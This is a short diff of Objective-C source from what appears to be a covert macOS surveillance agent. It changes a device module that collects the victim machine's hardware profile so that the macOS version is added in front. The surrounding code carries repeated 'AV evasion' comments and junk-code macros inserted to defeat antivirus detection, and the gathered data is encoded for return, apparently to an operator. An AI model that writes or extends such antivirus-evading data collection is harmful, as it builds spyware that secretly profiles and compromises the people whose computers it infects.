@@ -125,7 +125,8 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
   AV_GARBAGE_000
   
   NSData *retData = nil;
-  NSString *systemInfoStr = nil;
+  NSString *systemInfoStrHw = nil;
+  NSMutableString *systemInfoStr = nil;
   NSDictionary *hwDict;
   
   // AV evasion: only on release build
@@ -199,17 +200,21 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
         // AV evasion: only on release build
         AV_GARBAGE_009
   
-        systemInfoStr = (NSString*)[sp performSelector: @selector(stringForItem:dataType:)
+        systemInfoStrHw = (NSString*)[sp performSelector: @selector(stringForItem:dataType:)
                                             withObject: hwDict
                                             withObject: aType];
         
         // AV evasion: only on release build
         AV_GARBAGE_007
         
-        if (systemInfoStr != nil) 
+        if (systemInfoStrHw != nil)
         {   
           // AV evasion: only on release build
           AV_GARBAGE_001
+          
+          systemInfoStr = [NSMutableString stringWithFormat:@"\nSoftware:\nMacOS version: %u.%u.%u\n\n",
+                                                            gOSMajor, gOSMinor, gOSBugFix];
+          [systemInfoStr appendString: systemInfoStrHw];
           
           retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
           
